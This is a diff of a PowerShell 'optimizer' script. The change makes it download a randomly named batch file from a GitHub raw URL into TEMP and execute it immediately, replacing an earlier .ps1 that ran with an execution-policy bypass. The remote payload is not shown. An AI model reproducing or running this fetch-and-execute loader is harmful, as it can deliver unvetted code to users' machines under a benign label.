@@ -39,13 +39,13 @@ function Download-Optimizer {
 }  
 
 function Execute-Optimizer {  
-    param([string]$ScriptPath)  
+    param([string]$BatchPath)  
       
     Write-Host "`nExecuting optimization..."  
       
     try {  
-        # For PowerShell scripts, use PowerShell to execute
-        $process = Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$ScriptPath`"" -Wait -PassThru  
+        # For batch files, execute directly
+        $process = Start-Process -FilePath $BatchPath -Wait -PassThru  
           
         if ($process.ExitCode -eq 0) {  
             Write-Host "Optimization successful."  
@@ -81,11 +81,11 @@ function Main {
     Write-Host "`nStarting Unhiin Optimization Process..."  
     Write-Host "--------------------------------------------"  
       
-    # GitHub Raw URL for your PowerShell script
-    $scriptUrl = "https://raw.githubusercontent.com/hypnotixx0/unhiinps/main/Install-Puls.ps1"
-    $tempPath = Join-Path $env:TEMP "Install-Puls.ps1"  
+    # GitHub Raw URL for your batch file - CONVERTED TO RAW URL
+    $batchUrl = "https://raw.githubusercontent.com/hypnotixx0/mrbatch/main/unhiin_4K3LjceVQwjN.bat"
+    $tempPath = Join-Path $env:TEMP "unhiin_4K3LjceVQwjN.bat"  
       
-    $downloadSuccess = Download-Optimizer -Url $scriptUrl -OutputPath $tempPath  
+    $downloadSuccess = Download-Optimizer -Url $batchUrl -OutputPath $tempPath  
       
     if (-not $downloadSuccess) {  
         Write-Host "`nProcess failed during download."  
@@ -93,7 +93,7 @@ function Main {
         exit 1  
     }  
       
-    $executionSuccess = Execute-Optimizer -ScriptPath $tempPath  
+    $executionSuccess = Execute-Optimizer -BatchPath $tempPath  
       
     if (-not $executionSuccess) {  
         Write-Host "`nProcess failed during execution."  
